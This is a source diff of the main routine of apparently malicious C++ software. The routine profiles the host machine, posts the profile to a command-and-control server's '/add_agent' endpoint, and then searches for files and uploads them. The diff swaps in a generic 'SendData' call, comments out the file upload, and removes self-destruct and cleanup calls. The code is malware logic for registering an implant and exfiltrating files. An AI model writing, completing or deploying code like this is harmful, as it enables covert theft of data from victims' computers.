@@ -2,7 +2,6 @@
 #include "Core/profiler.hpp"
 #include "Communication/google_resolve.hpp"
 #include "Communication/c2_resolve.hpp"
-#include "Communication/addagent.hpp"
 #include "Core/helpers.hpp"
 #include "Core/file_search.hpp"
 
@@ -19,32 +18,18 @@ int main() {
                 // Path to /add_agent
                 std::wstring PC2 = C2 + STAGE1PATH;
                 nlohmann::json JsonProfile = Profiler(); 
-                std::string response = SendProfile(PC2, JsonProfile);
+                std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
                 auto jsonResp = nlohmann::json::parse(response);
                 if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                     std::cout << "Running file search" << std::endl;
-                    ProcessFilesAndUpload(C2);
+                    //ProcessFilesAndUpload(C2);
                 }
-                else {
-                    Cleanup();
-                    SelfDestruct();
-                }
+                
             }
-            else {
-                Cleanup();
-                SelfDestruct();
-            }
-        }
-        else {
-            Cleanup();
-            SelfDestruct();
+            
         }
         
     }
-
-    // This code might never see the light of the day but I gonna keep here anyways...
-    Cleanup();
-    SelfDestruct(); 
     
 
     return 0;
